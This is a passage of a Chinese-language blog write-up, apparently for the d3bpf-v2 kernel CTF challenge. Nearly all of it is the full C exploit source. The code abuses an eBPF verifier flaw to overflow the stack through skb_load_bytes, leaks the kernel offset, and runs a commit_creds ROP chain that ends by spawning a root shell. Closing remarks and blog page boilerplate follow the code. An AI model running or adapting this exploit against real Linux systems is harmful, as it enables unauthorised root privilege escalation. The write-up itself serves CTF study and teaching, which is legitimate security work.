*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out, <span class="keyword">char</span> *write_buf, <span class="keyword">size_t</span> write_nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_nbytes != write(socks[<span class="number">1</span>], write_buf, write_nbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] write not so good\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack()                                    \</span></span><br><span class="line"><span class="meta">    BPF_MOV64_IMM(BPF_REG_9, 64),                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">leak_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">16</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0xFF</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(leak_insn, <span class="keyword">sizeof</span>(leak_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, buf, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        save_status();</span><br><span class="line">        signal(SIGSEGV, &amp;get_shell);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_offset + <span class="number">0xffffffff810d7210</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = kernel_offset + <span class="number">0xffffffff82e6e860</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = kernel_offset + <span class="number">0xffffffff81097050</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = kernel_offset + <span class="number">0xffffffff81e0100b</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">        rop_chain[i++] = init_cred;</span><br><span class="line">        rop_chain[i++] = commit_creds;</span><br><span class="line">        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = &amp;get_shell;</span><br><span class="line">        rop_chain[i++] = user_cs;</span><br><span class="line">        rop_chain[i++] = user_rflags;</span><br><span class="line">        rop_chain[i++] = user_sp;</span><br><span class="line">        rop_chain[i++] = user_ss;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">attack_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">0x100</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(attack_insn, <span class="keyword">sizeof</span>(attack_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, rop_chain, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230111180153062.png"
+                      alt="image-20230111180153062"
+                ></p>
+<p>首先运行exp触发<code>soft panic</code>可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到<code>kernel_offset</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230111180450710.png"
+                      alt="image-20230111180450710"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230111180529651.png"
+                      alt="image-20230111180529651"
+                ></p>
+<h2 id="最后成功提权。"><a href="#最后成功提权。" class="headerlink" title="最后成功提权。"></a>最后成功提权。</h2><p>题目放在:<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/01/06/d3bpf/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">d3bpf</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>&nbsp;-&nbsp;
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="nav-text">分析题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80"><span class="nav-text">泄漏地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E6%88%90%E5%8A%9F%E6%8F%90%E6%9D%83%E3%80%82"><span class="nav-text">最后成功提权。</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
